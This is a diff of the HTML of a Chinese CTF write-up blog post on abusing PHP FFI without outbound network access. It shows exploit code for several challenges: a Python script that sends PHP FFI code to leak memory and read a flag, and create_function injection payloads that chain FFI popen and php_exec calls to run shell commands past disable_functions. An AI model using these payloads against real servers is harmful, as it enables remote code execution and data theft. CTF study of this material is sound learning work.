-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;rh&quot;</span>:<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">$ffi=FFI::load(&quot;/flag.h&quot;);</span></span><br><span class="line"><span class="string">//get flag</span></span><br><span class="line"><span class="string">//$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span></span><br><span class="line"><span class="string">//for($i = 0; $i &lt; 128; $i++)&#123;</span></span><br><span class="line"><span class="string">echo $a[$i];</span></span><br><span class="line"><span class="string">//&#125;</span></span><br><span class="line"><span class="string">$a = $ffi-&gt;new(&quot;char[8]&quot;, false);</span></span><br><span class="line"><span class="string">$a[0] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$a[1] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$a[2] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$a[3] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$a[4] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$a[5] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$a[6] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$a[7] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$b = $ffi-&gt;new(&quot;char[8]&quot;, false);</span></span><br><span class="line"><span class="string">$b[0] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$b[1] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$b[2] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$b[3] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$newa = $ffi-&gt;cast(&quot;void*&quot;, $a);</span></span><br><span class="line"><span class="string">var_dump($newa);</span></span><br><span class="line"><span class="string">$newb = $ffi-&gt;cast(&quot;void*&quot;, $b);</span></span><br><span class="line"><span class="string">var_dump($newb);</span></span><br><span class="line"><span class="string">$addr_of_a = FFI::new(&quot;unsigned long long&quot;);</span></span><br><span class="line"><span class="string">FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span></span><br><span class="line"><span class="string">var_dump($addr_of_a);</span></span><br><span class="line"><span class="string">$leak = FFI::new(FFI::arrayType($ffi-&gt;type(&#x27;char&#x27;), [102400]), false);</span></span><br><span class="line"><span class="string">FFI::memcpy($leak, $newa-0x20000, 102400);</span></span><br><span class="line"><span class="string">$tmp = FFI::string($leak,102400);</span></span><br><span class="line"><span class="string">var_dump($tmp);</span></span><br><span class="line"><span class="string">//var_dump($leak);</span></span><br><span class="line"><span class="string">//$leak[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="string">//$leak[1] = 0x61616161;</span></span><br><span class="line"><span class="string">//var_dump($a);</span></span><br><span class="line"><span class="string">//FFI::memcpy($newa-0x8, $leak, 128*8);</span></span><br><span class="line"><span class="string">//var_dump($a);</span></span><br><span class="line"><span class="string">//var_dump(777);</span></span><br><span class="line"><span class="string">&#125; catch (FFI\Exception $ex) &#123;</span></span><br><span class="line"><span class="string">echo $ex-&gt;getMessage(), PHP_EOL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var_dump(1);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>((res.text).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;rh&quot;</span>:<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">$ffi=FFI::load(&quot;/flag.h&quot;);</span></span><br><span class="line"><span class="string">//get flag</span></span><br><span class="line"><span class="string">//$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span></span><br><span class="line"><span class="string">//for($i = 0; $i &lt; 128; $i++)&#123;</span></span><br><span class="line"><span class="string">echo $a[$i];</span></span><br><span class="line"><span class="string">//&#125;</span></span><br><span class="line"><span class="string">$a = $ffi-&gt;new(&quot;char[8]&quot;, false);</span></span><br><span class="line"><span class="string">$a[0] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$a[1] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$a[2] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$a[3] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$a[4] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$a[5] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$a[6] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$a[7] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$b = $ffi-&gt;new(&quot;char[8]&quot;, false);</span></span><br><span class="line"><span class="string">$b[0] = &#x27;f&#x27;;</span></span><br><span class="line"><span class="string">$b[1] = &#x27;l&#x27;;</span></span><br><span class="line"><span class="string">$b[2] = &#x27;a&#x27;;</span></span><br><span class="line"><span class="string">$b[3] = &#x27;g&#x27;;</span></span><br><span class="line"><span class="string">$newa = $ffi-&gt;cast(&quot;void*&quot;, $a);</span></span><br><span class="line"><span class="string">var_dump($newa);</span></span><br><span class="line"><span class="string">$newb = $ffi-&gt;cast(&quot;void*&quot;, $b);</span></span><br><span class="line"><span class="string">var_dump($newb);</span></span><br><span class="line"><span class="string">$addr_of_a = FFI::new(&quot;unsigned long long&quot;);</span></span><br><span class="line"><span class="string">FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span></span><br><span class="line"><span class="string">var_dump($addr_of_a);</span></span><br><span class="line"><span class="string">$leak = FFI::new(FFI::arrayType($ffi-&gt;type(&#x27;char&#x27;), [102400]), false);</span></span><br><span class="line"><span class="string">FFI::memcpy($leak, $newa-0x20000, 102400);</span></span><br><span class="line"><span class="string">$tmp = FFI::string($leak,102400);</span></span><br><span class="line"><span class="string">var_dump($tmp);</span></span><br><span class="line"><span class="string">//var_dump($leak);</span></span><br><span class="line"><span class="string">//$leak[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="string">//$leak[1] = 0x61616161;</span></span><br><span class="line"><span class="string">//var_dump($a);</span></span><br><span class="line"><span class="string">//FFI::memcpy($newa-0x8, $leak, 128*8);</span></span><br><span class="line"><span class="string">//var_dump($a);</span></span><br><span class="line"><span class="string">//var_dump(777);</span></span><br><span class="line"><span class="string">&#125; catch (FFI\Exception $ex) &#123;</span></span><br><span class="line"><span class="string">echo $ex-&gt;getMessage(), PHP_EOL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var_dump(1);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>((res.text).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>
 
 <p>内存处理的代码是这里</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$addr_of_a</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;unsigned long long&quot;</span>);</span><br><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$addr_of_a</span>, FFI::<span class="title function_ invoke__">addr</span>(<span class="variable">$newa</span>), <span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$addr_of_a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$leak</span> = FFI::<span class="keyword">new</span>(FFI::<span class="title function_ invoke__">arrayType</span>(<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">type</span>(<span class="string">&#x27;char&#x27;</span>), [<span class="number">102400</span>]), <span class="literal">false</span>);</span><br><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$leak</span>, <span class="variable">$newa</span>-<span class="number">0x20000</span>, <span class="number">102400</span>);</span><br><span class="line"><span class="variable">$tmp</span> = FFI::<span class="keyword">string</span>(<span class="variable">$leak</span>, <span class="number">102400</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$tmp</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$addr_of_a</span> = FFI::<span class="keyword">new</span>(<span class="string">&quot;unsigned long long&quot;</span>);</span><br><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$addr_of_a</span>, FFI::<span class="title function_ invoke__">addr</span>(<span class="variable">$newa</span>), <span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$addr_of_a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$leak</span> = FFI::<span class="keyword">new</span>(FFI::<span class="title function_ invoke__">arrayType</span>(<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">type</span>(<span class="string">&#x27;char&#x27;</span>), [<span class="number">102400</span>]), <span class="literal">false</span>);</span><br><span class="line">FFI::<span class="title function_ invoke__">memcpy</span>(<span class="variable">$leak</span>, <span class="variable">$newa</span>-<span class="number">0x20000</span>, <span class="number">102400</span>);</span><br><span class="line"><span class="variable">$tmp</span> = FFI::<span class="keyword">string</span>(<span class="variable">$leak</span>, <span class="number">102400</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$tmp</span>);</span><br></pre></td></tr></table></figure>
 
 <p>看不懂，相当于就是把地址内容复制过去了然后输出，再创建一个大小为 102400 字节的字符数组 <code>$leak</code>，并尝试从 <code>$newa</code> 偏移 <code>0x20000</code> 字节的地址处复制到 <code>$leak</code>，然后就泄露了？</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi=FFI::load(&quot;/flag.h&quot;);</span><br><span class="line">$a=$ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line">var_dump(FFI::string($a));</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi=FFI::load(&quot;/flag.h&quot;);</span><br><span class="line">$a=$ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line">var_dump(FFI::string($a));</span><br></pre></td></tr></table></figure>
 
 <h3 id="极客大挑战-2020-FighterFightsInvincibly"><a href="#极客大挑战-2020-FighterFightsInvincibly" class="headerlink" title="[极客大挑战 2020] FighterFightsInvincibly"></a>[极客大挑战 2020] FighterFightsInvincibly</h3><p>这里进去直接就可以拿到源码，一样的我们链接antsword</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $_REQUEST[&#x27;fighter&#x27;]($_REQUEST[&#x27;fights&#x27;],$_REQUEST[&#x27;invincibly&#x27;]); --&gt;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $_REQUEST[&#x27;fighter&#x27;]($_REQUEST[&#x27;fights&#x27;],$_REQUEST[&#x27;invincibly&#x27;]); --&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这里很明显的一个<code>create_function</code>注入</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-164207.png"
-                      alt="1"
-                ></p>
+<p><img src="/../images/achieve/202411/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84ini/QQ20241110-164207.png" alt="1"></p>
 <p>嗯宣那就链接就行，然后这里是不出网的，我们寻找C语言里面能够执行命令的并且不在disable里面的</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_exec</span><br><span class="line">popen</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_exec</span><br><span class="line">popen</span><br></pre></td></tr></table></figure>
 
 <p><strong>popen</strong>是C语言的</p>
 <p><strong>php_exec</strong>是php源码中的一个函数，当type为3时为<code>passthru</code>，为1时为<code>system</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=ffi-&gt;<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls /&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$c</span>=<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$b</span>.=<span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">dechex</span>(<span class="variable">$c</span>)),<span class="number">2</span>,<span class="string">&quot;0&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">pclose</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=ffi-&gt;<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls /&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$c</span>=<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$b</span>.=<span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">dechex</span>(<span class="variable">$c</span>)),<span class="number">2</span>,<span class="string">&quot;0&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">pclose</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi=FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$a=$ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$b=&quot;&quot;;while(($c=$ffi-&gt;fgetc($a))!=-1)&#123;$b.=str_pad(dechex($c),2,&quot;0&quot;,STR_PAD_LEFT);&#125; $ffi-&gt;pclose($a);echo hex2bin($b);/*</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi=FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$a=$ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$b=&quot;&quot;;while(($c=$ffi-&gt;fgetc($a))!=-1)&#123;$b.=str_pad(dechex($c),2,&quot;0&quot;,STR_PAD_LEFT);&#125; $ffi-&gt;pclose($a);echo hex2bin($b);/*</span><br></pre></td></tr></table></figure>
 
 <p>成功了，还有一个也写写exp</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int php_exec(int type,char *cmd);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">php_exec</span>(<span class="number">3</span>,<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int php_exec(int type,char *cmd);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">php_exec</span>(<span class="number">3</span>,<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi=FFI::cdef(&quot;int php_exec(int type,char *cmd);&quot;); $ffi-&gt;php_exec(3,&quot;ls /&quot;);/*</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi=FFI::cdef(&quot;int php_exec(int type,char *cmd);&quot;); $ffi-&gt;php_exec(3,&quot;ls /&quot;);/*</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>好玩好用，不过这个要对函数都比较熟悉，如果函数都不知道用那个也是白给</p>
 
-		</div>
+  </div>
+</article>
 
-		
-		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-			<div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> php中不出网的FFI</li>
-        <li><strong>Author:</strong> baozongwi</li>
-        <li><strong>Created at
-                :</strong> 2024-11-08 09:27:18</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2024-11-10 17:05:47
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://baozongwi.xyz/2024/11/08/php中不出网的FFI/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
 
-            
-                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
-            
-        </li>
-    </ul>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-question"><span class="toc-number">2.</span> <span class="toc-text">0x02 question</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3"><span class="toc-number">2.1.</span> <span class="toc-text">了解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-cdef"><span class="toc-number">2.1.1.</span> <span class="toc-text">FFI::cdef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-load"><span class="toc-number">2.1.2.</span> <span class="toc-text">FFI::load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI-new"><span class="toc-number">2.1.3.</span> <span class="toc-text">FFI::new</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.2.</span> <span class="toc-text">利用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RCTF-2019-Nextphp"><span class="toc-number">2.2.1.</span> <span class="toc-text">[RCTF 2019]Nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCTF-2020-easyphp"><span class="toc-number">2.2.2.</span> <span class="toc-text">TCTF 2020 easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#noeasyphp-revenge"><span class="toc-number">2.2.3.</span> <span class="toc-text">noeasyphp(revenge)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-FighterFightsInvincibly"><span class="toc-number">2.2.4.</span> <span class="toc-text">[极客大挑战 2020] FighterFightsInvincibly</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&text=php中不出网的FFI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&is_video=false&description=php中不出网的FFI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php中不出网的FFI&body=Check out this article: https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2024/11/08/php%E4%B8%AD%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84FFI/&title=php中不出网的FFI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
